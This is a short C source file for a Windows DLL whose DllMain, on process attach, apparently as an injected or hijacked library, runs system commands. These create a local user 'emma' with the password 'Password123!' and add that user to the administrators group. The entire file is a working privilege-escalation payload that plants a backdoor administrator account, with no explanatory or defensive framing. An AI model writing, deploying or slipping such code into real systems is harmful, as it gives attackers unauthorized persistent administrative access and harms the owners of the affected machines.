#include <windows.h>  
#include <stdlib.h>  

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
      // Code executed when the DLL is injected
      system("net user emma Password123! /add");
      system("net localgroup administrators emma /add");
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE; // Indicate successful execution
}